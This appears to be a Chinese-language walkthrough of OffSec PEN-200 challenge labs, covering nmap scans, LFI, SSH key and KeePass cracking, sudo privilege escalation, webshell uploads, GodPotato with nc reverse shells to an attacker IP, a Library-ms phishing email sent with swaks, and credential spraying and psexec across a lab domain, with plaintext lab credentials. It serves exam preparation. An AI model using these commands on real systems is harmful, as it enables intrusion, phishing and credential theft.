|_ftp-bounce: bounce working!
| ftp-syst: 
|_  SYST: UNIX emulated by FileZilla
14080/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Bad Request
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC

Host script results:
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2025-03-24T05:53:16
|_  start_date: N/A

============================================192.168.102.248===========================================================
Nmap scan report for 192.168.102.248
Host is up (0.0032s latency).
Not shown: 65520 closed ports
PORT      STATE SERVICE       VERSION
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
| http-robots.txt: 16 disallowed entries (15 shown)
| /*/ctl/ /admin/ /App_Browsers/ /App_Code/ /App_Data/ 
| /App_GlobalResources/ /bin/ /Components/ /Config/ /contest/ /controls/ 
|_/Documentation/ /HttpModules/ /Install/ /Providers/
|_http-title: Home
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: EXTERNAL
|   NetBIOS_Domain_Name: EXTERNAL
|   NetBIOS_Computer_Name: EXTERNAL
|   DNS_Domain_Name: EXTERNAL
|   DNS_Computer_Name: EXTERNAL
|   Product_Version: 10.0.20348
|_  System_Time: 2025-03-24T05:53:15+00:00
| ssl-cert: Subject: commonName=EXTERNAL
| Not valid before: 2025-03-23T05:47:28
|_Not valid after:  2025-09-22T05:47:28
|_ssl-date: 2025-03-24T05:53:36+00:00; 0s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC
49965/tcp open  ms-sql-s      Microsoft SQL Server
| ms-sql-ntlm-info: 
|   Target_Name: EXTERNAL
|   NetBIOS_Domain_Name: EXTERNAL
|   NetBIOS_Computer_Name: EXTERNAL
|   DNS_Domain_Name: EXTERNAL
|   DNS_Computer_Name: EXTERNAL
|_  Product_Version: 10.0.20348
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2024-09-17T13:19:45
|_Not valid after:  2054-09-17T13:19:45
|_ssl-date: 2025-03-24T05:53:36+00:00; 0s from scanner time.

Host script results:
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2025-03-24T05:53:22
|_  start_date: N/A

============================================192.168.102.249===========================================================
Nmap scan report for 192.168.102.249
Host is up (0.0032s latency).
Not shown: 65520 closed ports
PORT      STATE SERVICE       VERSION
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: LEGACY
|   NetBIOS_Domain_Name: LEGACY
|   NetBIOS_Computer_Name: LEGACY
|   DNS_Domain_Name: LEGACY
|   DNS_Computer_Name: LEGACY
|   Product_Version: 10.0.20348
|_  System_Time: 2025-03-24T05:53:14+00:00
| ssl-cert: Subject: commonName=LEGACY
| Not valid before: 2025-03-23T05:47:25
|_Not valid after:  2025-09-22T05:47:25
|_ssl-date: 2025-03-24T05:53:35+00:00; 0s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
8000/tcp  open  http          Apache httpd 2.4.54 ((Win64) OpenSSL/1.1.1p PHP/7.4.30)
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: Apache/2.4.54 (Win64) OpenSSL/1.1.1p PHP/7.4.30
| http-title: Welcome to XAMPP
|_Requested resource was http://192.168.102.249:8000/dashboard/
|_https-redirect: ERROR: Script execution failed (use -d to debug)
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC

Host script results:
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2025-03-24T05:53:26
|_  start_date: N/A
```



题目给了192.168.102.250的凭据：offsec/lab，通过nmap扫描发现机器开启3389，使用RDP连接

```
xfreerdp /u:offsec /p:'lab' /v:192.168.102.250 +clipboard
```

成功登录，用户在管理员组，可以直接启管理员cmd

![image-20250324163840319](./oscp_pwk.assets/image-20250324163840319.png)

上传mimikatz转存hash，没找到明文密码，查看网卡发现这是一个单网卡主机，不通向网段172，主机hosts也没有域的相关域名配置

![image-20250324165851178](./oscp_pwk.assets/image-20250324165851178.png)



### 192.168.102.245

nmap扫描显示21端口可以匿名登录，但是上去看不到任何文件，8000的http端口开放站点有登录功能

![image-20250324160014462](./oscp_pwk.assets/image-20250324160014462.png)

80和443是一套网站，通过目录扫描发现任意文件读取，而且BP成功读取/etc/passwd文件

![image-20250324171933033](./oscp_pwk.assets/image-20250324171933033.png)

245开启了ssh，收集`/etc/passwd`用户：offsec/lxd/miranda/steven/mark/anita

尝试读取私钥/home/用户/.ssh/id_rsa，失败了，但是读取authorized_keys发现`anita`用户是存在公钥的，那就肯定有私钥

![image-20250324173750066](./oscp_pwk.assets/image-20250324173750066.png)

根据这个特征问了下GPT，私钥名字可能是：id_ecdsa  （因为是ecdsa加密了吧

![image-20250324173838144](./oscp_pwk.assets/image-20250324173838144.png)

成功读取私钥，保存在本地，给700权限使用ssh登录，但是连接会显示输入密码

![image-20250324174229560](./oscp_pwk.assets/image-20250324174229560.png)

使用ssh2john转化格式并爆破

```
ssh2john id_ecdsa > id_ecdsa.hash
john id_ecdsa.hash --wordlist=~/rockyou.txt
```

![image-20250324174559272](./oscp_pwk.assets/image-20250324174559272.png)

拿到密码：fireball

成功登录，并且拿到local

![image-20250324174654250](./oscp_pwk.assets/image-20250324174654250.png)

查看网卡信息这台机器也没通向172网段

经过漫长的探索，使用CVE-2021-3156成功提权root，相关文章（直接跟着后面git clone开始就行）：https://blog.csdn.net/IronmanJay/article/details/139379712

提升到root权限，拿到proof

![image-20250324194240724](./oscp_pwk.assets/image-20250324194240724.png)



### 192.168.102.246

开启了80/443WEB服务如下，还有6666的ssh，通过nmap扫描判断可能是一台ubuntu

![image-20250324161047333](./oscp_pwk.assets/image-20250324161047333.png)

用245获得的私钥成功登录该机器，密码为：fireball

``` 
ssh anita@192.168.102.246 -p 2222 -i id_ecdsa 
```

![image-20250324190740458](./oscp_pwk.assets/image-20250324190740458.png)

上传linpeas.sh发现还开启了8000端口，这是我们扫描不曾发现的

![image-20250324202011096](./oscp_pwk.assets/image-20250324202011096.png)

上传iox搭建隧道代理出来

![image-20250324202507891](./oscp_pwk.assets/image-20250324202507891.png)

而且这个网站的源码我们刚刚好像也翻到了，在`/var/www/internal/`，在站点随便点点发现可以LFI的地方，验证了下确实有

![image-20250324204042127](./oscp_pwk.assets/image-20250324204042127.png)

那我们可以在用户家目录下整一个shell.php包含（这样好像还不行

我们在`/var/crash`目录下发现一个php文件

![image-20250324204455612](./oscp_pwk.assets/image-20250324204455612.png)

成功RCE，这里要注意不是用`?`传参，得用`&`（多参数

![image-20250324204627112](./oscp_pwk.assets/image-20250324204627112.png)

使用python3反弹shell，信息收集发现`sudo -l`可以无密码执行任何命令，拿到proof

![image-20250324205251562](./oscp_pwk.assets/image-20250324205251562.png)

最后转存shadow文件到本地尝试破解

### 192.168.102.247

这台机器开放端口比较多，nmap扫描到ftp匿名访问而且有个文件夹

![image-20250324161544003](./oscp_pwk.assets/image-20250324161544003.png)

通过该pdf可以发现一个凭证信息：mark/OathDeeplyReprieve91，并且提示需要通过域名访问（例如：web02.relia.com）

80端口如下，看了下应该是静态页面

![image-20250324162932530](./oscp_pwk.assets/image-20250324162932530.png)

添加解析进host文件

```
192.168.102.247 web02.relia.com
```

修改hosts后，尝试访问nmap扫描出来的14080http端口成功访问到应用

![image-20250325183656678](./oscp_pwk.assets/image-20250325183656678.png)

可以使用凭证：`mark@Relia.com/OathDeeplyReprieve91` （mark不能登陆，要加上邮箱后缀

成功登录

![image-20250325184408350](./oscp_pwk.assets/image-20250325184408350.png)

后台翻到版本号为：7.12.4

![image-20250325184530854](./oscp_pwk.assets/image-20250325184530854.png)

存在RCE漏洞，exp这个不好用，用的是：https://github.com/Jonoans/Umbraco-RCE

收到shell

![image-20250325194121237](./oscp_pwk.assets/image-20250325194121237.png)

C盘根目录拿到local

![image-20250325194220921](./oscp_pwk.assets/image-20250325194220921.png)

`whoami /priv`发现模拟权限

![image-20250325194820930](./oscp_pwk.assets/image-20250325194820930.png)

上传SweetPotato，提权失败了，PrintSpoofer.exe也不行，换到GodPotato成功提权

```
.\GodPotato-NET4.exe -cmd "C:\Users\Public\nc.exe 192.168.45.175 80 -e cmd.exe"
```

![image-20250325195842548](./oscp_pwk.assets/image-20250325195842548.png)

拿到proof

![image-20250325200149294](./oscp_pwk.assets/image-20250325200149294.png)

最后上传mimikatz转存hash

### 192.168.102.248

值得注意的是开启了49965mssql服务，80端口开启http服务，存在登录点

![image-20250326150453712](./oscp_pwk.assets/image-20250326150453712.png)

使用弱口令admin/password成功登录，在后台Security->more->MORE SECURITY SETTINGS手动添加白名单aspx

然后再这里上传aspx木马

![image-20250326153919282](./oscp_pwk.assets/image-20250326153919282.png)

成功执行命令，这里用的shell是：https://github.com/ivanitlearning/CTF-Repos/blob/b5364388a861fc7457409d494a9d075d73e7867e/HTB/Silo/cmdasp.aspx#L4

![image-20250326160246817](./oscp_pwk.assets/image-20250326160246817.png)

信息收集发现模拟权限

![image-20250326160324693](./oscp_pwk.assets/image-20250326160324693.png)

使用GodPotato成功提权

```
.\GodPotato-NET4.exe -cmd ".\nc.exe 192.168.45.175 80 -e cmd.exe"
```

![image-20250326161310410](./oscp_pwk.assets/image-20250326161310410.png)

拿到local和proof

![image-20250326161430124](./oscp_pwk.assets/image-20250326161430124.png)

上传mimikatz转存hash，最后翻找主机敏感文件（txt文件有时候很多，建议分开看）

```
Get-ChildItem -Path C:\ -Include *.pdf,*.xls,*.xlsx,*.doc,*.docx,*.kdbx -File -Recurse -ErrorAction SilentlyContinue
Get-ChildItem -Path C:\ -Include *.txt -File -Recurse -ErrorAction SilentlyContinue
```

有一个Database.kdbx文件（bing解释为：**存储密码的加密数据库**

![image-20250326161822994](./oscp_pwk.assets/image-20250326161822994.png)

最后看WP发现这题还有一个appkey，可以通过

### 192.168.102.249(钓鱼入口)

8000端口有XAMPP应用，使用dirsearch扫描目录，发现cms目录

![image-20250325202337659](./oscp_pwk.assets/image-20250325202337659.png)

页面右下角有版本号

![image-20250326123719642](./oscp_pwk.assets/image-20250326123719642.png)

有一个需要认证的RCE

![image-20250326123802973](./oscp_pwk.assets/image-20250326123802973.png)

后台为：http://192.168.102.249:8000/cms/admin.php

可以使用admin/admin登录，按照RCE exp的步骤上传pHp文件，成功执行命令

![image-20250326124349401](./oscp_pwk.assets/image-20250326124349401.png)

看了下网卡是个单网卡主机，上传nc反弹shell，拿到local

![image-20250326124719851](./oscp_pwk.assets/image-20250326124719851.png)

`whoami /priv`发现SeImpersonatePrivilege权限

![image-20250326124820081](./oscp_pwk.assets/image-20250326124820081.png)

使用GodPotato成功提权

```
.\GodPotato-NET4.exe -cmd ".\nc.exe 192.168.45.175 80 -e cmd.exe"
```

![image-20250326131237511](./oscp_pwk.assets/image-20250326131237511.png)

在`damon`用户找到proof

![image-20250326131437701](./oscp_pwk.assets/image-20250326131437701.png)

最后看了其他师傅的wp，普通用户(提权前)在powershell的历史命令文件可以找到damon管理员的密码：i6yuT6tym@

![image-20250326131803949](./oscp_pwk.assets/image-20250326131803949.png)

在主机上 git命令，搜索git仓库发现

```
dir /s /b /ah C:\.git
```

![image-20250326145037749](./oscp_pwk.assets/image-20250326145037749.png)

使用我打包下载到本地看了下，有一个邮箱凭证：`maildmz@relia.com:DPuBT9tGCBrTbR`

![image-20250326150015106](./oscp_pwk.assets/image-20250326150015106.png)

可以尝试发送钓鱼邮件

### 172.16.62.14

这里确实难住了，看到其他师傅的思路是制作Library-ms钓鱼邮件，需要本地启动WebDAV服务

> `Library-ms` 是 Windows 库文件（Library），可以用于伪装成合法文件，而实际上指向一个远程 WebDAV 服务器。

按照这篇文章的教程：https://github.com/808ale/WinLib_Gen.git

```
wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root .
```

使用命令生成config.Library-ms

```
python3 winlib_gen.py -l 192.168.45.175 -p 90
```

将标记的命令放入快捷方式的`位置`信息中（按照github教程制作就行，这里我将8000改成了80，直接用WebDAV省去python -m启动

![image-20250326183434139](./oscp_pwk.assets/image-20250326183434139.png)

使用swaks发送带有附件的邮件

```
swaks -t jim@relia.com --from mark@relia.com --attach @config.Library-ms --server 192.168.102.189 --body @body.txt --header "Subject: Staging Script" --suppress-data -auth-user maildmz@relia.com --auth-password DPuBT9tGCBrTbR
```

保持WebDAV启动监听90端口收到shell

![image-20250326183325266](./oscp_pwk.assets/image-20250326183325266.png)

拿到local，机器为172网段，突破网络边界

![image-20250326183742423](./oscp_pwk.assets/image-20250326183742423.png)

用户jim有权限进入offsec桌面，可以直接拿到proof

![image-20250326184230773](./oscp_pwk.assets/image-20250326184230773.png)

域内用户信息收集

![image-20250326184316446](./oscp_pwk.assets/image-20250326184316446.png)

用户如下

```
Administrator
andrea
anna
brad
dan
Guest
iis_service
internaladmin
jenny
jim
krbtgt
larry
maildmz
michelle
milana
mountuser
```

主机文件搜索发现Database.kdbx

![image-20250326184908618](./oscp_pwk.assets/image-20250326184908618.png)

下载本地查看，需要用keepassxc工具：`sudo apt-get install keepassxc`

使用`keepassxc Database.kdbx`打开会提示输入密码

![image-20250326190441771](./oscp_pwk.assets/image-20250326190441771.png)

使用john破解

```
keepass2john Database.kdbx > Database.kdbx.hash
john Database.kdbx.hash --wordlist=~/rockyou.txt 
```

![image-20250326191737136](./oscp_pwk.assets/image-20250326191737136.png)

密码为：mercedes1，成功登录，拿到两个凭证信息

![image-20250326191908878](./oscp_pwk.assets/image-20250326191908878.png)

![image-20250326191922127](./oscp_pwk.assets/image-20250326191922127.png)

```
dmzadmin/SlimGodhoodMope
jim@relia.com/Castello1!
```

最后上传iox搭建隧道，内网信息收集

```
naabu -list ips.txt -rate 500 -top-ports 1000 -proxy 127.0.0.1:1080
```
![image-20250326210855477](./oscp_pwk.assets/image-20250326210855477.png)

### 192.168.102.191

使用172.16.62.14收集的凭证：dmzadmin/SlimGodhoodMope  可以RDP登录这台主机

```
xfreerdp /v:192.168.102.191:3389 /u:dmzadmin /p:SlimGodhoodMope +clipboard
```

桌面拿到proof

![image-20250326211243586](./oscp_pwk.assets/image-20250326211243586.png)

这也是一个双网卡主机，通向172（用这个搭建代理会更方便些

### 内网信息收集

整理172.16.62.14的扫描结果如下

| IP           | 开放端口                                                    |
| ------------ | ----------------------------------------------------------- |
| 172.16.62.6  | 53, 88, 135, 139, 389, 445, 464, 593, 636, 3268, 3269, 3389 |
| 172.16.62.7  | 80, 135, 139, 3306, 3389, 443, 445                          |
| 172.16.62.14 | 135, 139, 3389, 445                                         |
| 172.16.62.15 | 135, 139, 3389, 445                                         |
| 172.16.62.19 | 22                                                          |
| 172.16.62.20 | 22                                                          |
| 172.16.62.21 | 135, 139, 445                                               |
| 172.16.62.30 | 80, 135, 139, 445, 3389                                     |

域用户如下

```
Administrator
andrea
anna
brad
dan
Guest
iis_service
internaladmin
jenny
jim
krbtgt
larry
maildmz
michelle
milana
mountuser
```

其中管理员有

```
Administrator
dan
internaladmin
```

首先对已知用户和密码进行喷洒
```
proxychains4 crackmapexec smb ips.txt -u 'relia.com/jim' -p 'Castello1!'
```

![image-20250326213053837](./oscp_pwk.assets/image-20250326213053837.png)

然后批量验证

```
while read ip; do proxychains4 smbclient -L //$ip -U relia.com/jim%Castello1!; done < ips.txt
```

有一台存在共享目录：172.16.62.21有一个monitoring目录有历史命令

```
proxychains4 smbclient //172.16.62.21/monitoring -U 'relia.com/mountuser%DRtajyCwcbWvH/9' 
```

在`PowerShell_transcript.FILES.9_DjDa0f.20221019132304.txt`文件找到administrator凭证：

```
RELIA\Administrator
vau!XCKjNQBv2$
```

![image-20250327151330020](./oscp_pwk.assets/image-20250327151330020.png)

使用crackmapexec喷洒用户密码

```
proxychains4 crackmapexec smb ips.txt -u 'Administrator' -p 'vau!XCKjNQBv2$' 
```

![image-20250327152203864](./oscp_pwk.assets/image-20250327152203864.png)

> crackmapexec攻击smb显示Pwn3d!代表是可以使用psexec登录rce的

按照这个逐一上去拿到flag就行

### 172.16.62.6(DC)

分析收集端口情况，`172.16.62.6`大概率为域控（只有它开了53，尝试使用psexec登录

![image-20250327152521103](./oscp_pwk.assets/image-20250327152521103.png)

是一台DC，而且是最高权限！

拿到proof

![image-20250327152741575](./oscp_pwk.assets/image-20250327152741575.png)



### 172.16.62.7

 psexec登录（这里得加上域名，不然不行

```
proxychains4 impacket-psexec 'RELIA.com/Administrator:vau!XCKjNQBv2$'@172.16.62.7
```

搜索拿到local和proof

![image-20250327185831000](./oscp_pwk.assets/image-20250327185831000.png)

### 172.16.62.15

psexec登录即可

```
proxychains4 impacket-psexec 'Administrator:vau!XCKjNQBv2$'@172.16.62.15
```

搜索得到local和proof

![image-20250327153855480](./oscp_pwk.assets/image-20250327153855480.png)

有一个Database.kdbx文件，提取出来

![image-20250327194506490](./oscp_pwk.assets/image-20250327194506490.png)

破解密码

```
keepass2john Database.kdbx > Database.kdbx.hash
john Database.kdbx.hash --wordlist=~/rockyou.txt
```

![image-20250328163154155](./oscp_pwk.assets/image-20250328163154155.png)

拿到密码：destiny1，发现一个ssh凭证（有账户密码和私钥）

![image-20250328163220262](./oscp_pwk.assets/image-20250328163220262.png)

### 172.16.62.21

psexec登录

```
proxychains4 impacket-psexec 'RELIA.com/Administrator:vau!XCKjNQBv2$'@172.16.62.21
```

![image-20250327193353300](./oscp_pwk.assets/image-20250327193353300.png)

### 172.16.62.30

psexec登录

```
proxychains4 impacket-psexec 'RELIA.com/Administrator:vau!XCKjNQBv2$'@172.16.62.30
```

主机只有proof

![image-20250327191642136](./oscp_pwk.assets/image-20250327191642136.png)

### 172.16.62.19

用172.16.62.15拿到的私钥登录即可

![image-20250328163819064](./oscp_pwk.assets/image-20250328163819064.png)

用户家目录那到local

上传并运行pspy32s

![image-20250328165507786](./oscp_pwk.assets/image-20250328165507786.png)

发现一个凭证：xinyVzoH2AnJpRK9sfMgBA，但是并不是root密码，也不能用sudo，发现是` /opt/borgbackup`目录borg命令查看备份的命令，但是恢复之后还是没权限进去恢复的目录，看别的师傅思路是htop会出现`{ "user": "amy", "pass": "0814b6b7f0de51ecf54ca5b6e6e612bf" }`（是/root/createbackup.sh定时运行产生的，但是我看了很久也没发现

md5值解密得到明文密码：backups1

拿到proof

![image-20250328180011508](./oscp_pwk.assets/image-20250328180011508.png)

最后看了下那个计划任务，在config.json确实找到了md5

![image-20250328180245172](./oscp_pwk.assets/image-20250328180245172.png)

在rsync.sh发现20的凭证

![image-20250328180131017](./oscp_pwk.assets/image-20250328180131017.png)

而且20机器复用了的etc目录，那证明用户都是一样的

### 172.16.62.20

同样用172.16.62.19拿到的凭证登录即可：andrew/Rb9kNokjDsjYyH

````
proxychains4 ssh andrew@172.16.62.20 -i sarah_key
````

拿到local

![image-20250328180753863](./oscp_pwk.assets/image-20250328180753863.png)

查找suid发现doas命令，搜索发现是sudo的替代品

![image-20250328181230487](./oscp_pwk.assets/image-20250328181230487.png)

可以启动apache24

```
doas service apache24 onestart
```

![image-20250328181725581](./oscp_pwk.assets/image-20250328181725581.png)

然后往apache24目录(`/usr/local/www/apache24/data/phpMyAdmin/tmp`)写入shell，web访问（注意转义

```
echo "<?php system(\$_GET['shell']); ?>" > shell.php
```

拿到proof

![image-20250328183516774](./oscp_pwk.assets/image-20250328183516774.png)



## Challenge 3 - Skylark

> 请注意，此挑战比挑战 1 和 2 要困难得多。它需要大量的横向移动、隧道构建、在多个目标上查找信息以及密切关注后渗透阶段。它*超出了* OSCP 考试的范围。如果您的主要目标是准备考试，您可能希望先完成挑战 4、5 和 6，然后再返回此挑战。祝你好运！
> Skylark Industries 是一家从事尖端航空技术研发工作的航空航天跨国公司。他们的一家主要分公司最近成为高级持续性威胁 (APT) 勒索软件攻击的目标。因此，公司首席信息安全官 (CISO) 现在正敦促进一步保护 Skylark Industries 的攻击面。 我们被指派对他们的总部基础设施进行一次先发制人的渗透测试，查找任何可能危及公司商业秘密的漏洞。
> 组织拓扑图如下所示，公有子网位于 `192.168.xx.0/24` 范围内，其中第三个八位字节的 `xx` 可以在控制面板的 *IP 地址*字段中找到。
>
> 
>
> ![Figure 1: Challenge Scenario](https://offsec-platform-prod.s3.amazonaws.com/offsec-courses/PEN-200-LABS/imgs/challengelab3/d15c6673c28f70ff5c78e39933d1539c-Topology1.png)

题目给了192.168.102.250的WINPREP操作系统凭据：offsec/lab

nmap扫描显示开启了3389，直接登录即可

```
xfreerdp /u:'offsec' /p:'lab' /v:192.168.102.250 +clipboard
```

使用enter+shift+ctrl可以直接调出管理员cmd

![image-20250403114850442](./oscp_pwk.assets/image-20250403114850442.png)

最后上传mimikatz转存hash

![image-20250403115148117](./oscp_pwk.assets/image-20250403115148117.png)





## Challenge 4 - OSCP A

> **10.10.62.140**
> 挑战 4 - DC01 操作系统凭据：
>
> ```
> No credentials were provided for this machine
> ```
>
> **192.168.102.141**
> 挑战 4 - MS01 操作系统凭据：
>
> ```
> Eric.Wallows / EricLikesRunning800
> ```
>
> **10.10.62.142**
> 挑战 4 - MS02 操作系统凭据：
>
> ```
> No credentials were provided for this machine
> ```
>
> **192.168.102.143**
> 挑战 4 - Aero OS 凭据：
>
> ```
> No credentials were provided for this machine
> ```
>
> **192.168.102.144**
> 挑战 4 - Crystal OS 凭据：
>
> ```
> No credentials were provided for this machine
> ```
>
> **192.168.102.145**
> 挑战 4 - Hermes OS 凭据：
>
> ```
> No credentials were provided for this machine
> ```
> 

10段主机通过V*N连接并不能ping通，可能有双网卡主机，先对192段的地址进行扫描


```
root@iZt4nbifrvtk7cy11744y4Z:~# nmap -p- -Pn -A -sS -T4 192.168.102.141 192.168.102.143-145
Starting Nmap 7.80 ( https://nmap.org ) at 2025-03-21 13:29 CST
=================================================================================================================
Nmap scan report for 192.168.102.141
Host is up (0.0035s latency).
Not shown: 65516 closed ports
PORT      STATE SERVICE         VERSION
22/tcp    open  ssh             OpenSSH for_Windows_8.1 (protocol 2.0)
| ssh-hostkey: 
|   3072 e0:3a:63:4a:07:83:4d:0b:6f:4e:8a:4d:79:3d:6e:4c (RSA)
|   256 3f:16:ca:33:25:fd:a2:e6:bb:f6:b0:04:32:21:21:0b (ECDSA)
|_  256 fe:b0:7a:14:bf:77:84:9a:b3:26:59:8d:ff:7e:92:84 (ED25519)
80/tcp    open  http            Apache httpd 2.4.51 ((Win64) PHP/7.4.26)
|_http-generator: Nicepage 4.8.2, nicepage.com
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.51 (Win64) PHP/7.4.26
|_http-title: Home
81/tcp    open  http            Apache httpd 2.4.51 ((Win64) PHP/7.4.26)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.51 (Win64) PHP/7.4.26
|_http-title: Attendance and Payroll System
135/tcp   open  msrpc           Microsoft Windows RPC
139/tcp   open  netbios-ssn     Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
3306/tcp  open  mysql           MySQL (unauthorized)
3307/tcp  open  opsession-prxy?
5040/tcp  open  unknown
5985/tcp  open  http            Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http            Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc           Microsoft Windows RPC
49665/tcp open  msrpc           Microsoft Windows RPC
49666/tcp open  msrpc           Microsoft Windows RPC
49667/tcp open  msrpc           Microsoft Windows RPC
49668/tcp open  msrpc           Microsoft Windows RPC
49669/tcp open  msrpc           Microsoft Windows RPC
49670/tcp open  msrpc           Microsoft Windows RPC
51775/tcp open  msrpc           Microsoft Windows RPC
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=3/21%OT=22%CT=1%CU=33869%PV=Y%DS=4%DC=T%G=Y%TM=67DCFC8
OS:6%P=x86_64-pc-linux-gnu)SEQ(SP=102%GCD=1%ISR=105%TI=I%CI=I%TS=U)OPS(O1=M
OS:54ENW8NNS%O2=M54ENW8NNS%O3=M54ENW8%O4=M54ENW8NNS%O5=M54ENW8NNS%O6=M54ENN
OS:S)WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FF70)ECN(R=Y%DF=Y%T=80%
OS:W=FFFF%O=M54ENW8NNS%CC=N%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)T2(R=
OS:N)T3(R=N)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=80%W=
OS:0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T
OS:7(R=N)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE
OS:(R=N)

Network Distance: 4 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2025-03-21T05:43:14
|_  start_date: N/A

TRACEROUTE (using port 111/tcp)
HOP RTT     ADDRESS
1   2.55 ms 192.168.45.1
2   2.55 ms 192.168.45.254
3   2.63 ms 192.168.251.1
4   2.83 ms 192.168.102.141
=================================================================================================================
Nmap scan report for 192.168.102.143
Host is up (0.0026s latency).
Not shown: 65525 filtered ports
PORT     STATE SERVICE    VERSION
21/tcp   open  ftp        vsftpd 3.0.3
22/tcp   open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http       Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
81/tcp   open  http       Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Test Page for the Nginx HTTP Server on Fedora
443/tcp  open  ssl/https  Apache/2.4.41 (Ubuntu)
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
3000/tcp open  ppp?
3001/tcp open  nessus?
3003/tcp open  cgms?
3306/tcp open  mysql      MySQL (unauthorized)
5432/tcp open  postgresql PostgreSQL DB 9.6.0 or later
| fingerprint-strings: 
|   SMBProgNeg: 
|     SFATAL
|     VFATAL
|     C0A000
|     Munsupported frontend protocol 65363.19778: server supports 2.0 to 3.0
|     Fpostmaster.c
|     L2113
|_    RProcessStartupPacket
| ssl-cert: Subject: commonName=aero
| Subject Alternative Name: DNS:aero
| Not valid before: 2021-05-10T22:20:48
|_Not valid after:  2031-05-08T22:20:48
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port3003-TCP:V=7.80%I=7%D=3/21%Time=67DCF9BE%P=x86_64-pc-linux-gnu%r(Ge
SF:nericLines,1,"\n")%r(GetRequest,1,"\n")%r(HTTPOptions,1,"\n")%r(RTSPReq
SF:uest,1,"\n")%r(Help,1,"\n")%r(SSLSessionReq,1,"\n")%r(TerminalServerCoo
